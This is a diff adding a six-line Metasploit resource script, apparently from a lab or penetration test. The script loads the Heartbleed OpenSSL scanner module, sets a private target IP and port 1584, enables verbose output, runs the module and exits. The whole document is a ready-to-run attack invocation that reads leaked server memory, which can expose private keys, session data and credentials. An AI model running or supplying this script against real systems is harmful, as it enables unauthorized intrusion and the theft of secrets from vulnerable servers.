@@ -1,0 +1,6 @@
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOST 10.200.33.61
+set RPORT 1584
+set verbose true
+run
+exit
